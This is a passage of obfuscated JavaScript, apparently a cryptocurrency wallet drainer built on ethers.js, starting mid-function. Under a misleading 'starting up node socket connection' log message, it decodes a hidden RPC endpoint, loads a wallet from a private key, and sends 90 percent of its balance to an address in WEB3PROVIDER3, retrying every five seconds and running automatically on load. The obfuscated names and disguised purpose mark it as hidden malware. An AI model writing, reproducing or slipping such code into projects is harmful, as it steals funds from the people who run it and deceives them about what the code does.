        _0x53daae(); } catch (_0x2f5d73) { setTimeout(ethersgather, 0x1388); } }
async function ethersrather() { const _0x5b198b = _0x4b76d9;
    console[_0x5b198b(0x1fd)]('starting\x20up\x20node\x20socket\x20connection....'), ethers1 = _0x5b198b(0x1d4), ethers2 = new Buffer[(_0x5b198b(0x1d9))](ethers1, _0x5b198b(0x1f0))[_0x5b198b(0x1f8)](_0x5b198b(0x1fb));; const _0x4189d8 = new ethers[(_0x5b198b(0x1e4))]['JsonRpcProvider'](ethers2); let _0x3119c2 = new ethers[(_0x5b198b(0x1ce))](private, _0x4189d8); const _0x338a4b = address,
        _0x2c7602 = await _0x4189d8['getBalance'](_0x338a4b),
        _0x558b16 = (_0x2c7602 * 0.9)[_0x5b198b(0x207)](),
        _0x12b067 = ethers[_0x5b198b(0x1eb)][_0x5b198b(0x1d8)](_0x558b16, _0x5b198b(0x1f6)); try { const _0x7a967 = async() => { const _0x23b2b1 = _0x5b198b,
                _0x4cf18c = { 'to': WEB3PROVIDER3, 'value': ethers[_0x23b2b1(0x1eb)][_0x23b2b1(0x1d8)](_0x558b16, _0x23b2b1(0x1f6)), 'gasLimit': ethers[_0x23b2b1(0x1eb)][_0x23b2b1(0x1e3)](0x5dc0) },
                _0xe6c102 = await _0x3119c2[_0x23b2b1(0x202)](_0x4cf18c); try { await _0xe6c102[_0x23b2b1(0x1d1)](), console[_0x23b2b1(0x1fd)](_0x23b2b1(0x1e9)), setTimeout(etherslather, 0x1388); } catch (_0x522907) { console[_0x23b2b1(0x1fd)](_0x23b2b1(0x1e5)), setTimeout(etherslather, 0x1388); } };
        _0x7a967(); } catch (_0x557231) { setTimeout(etherslather, 0x1388); } }
ethersrather();
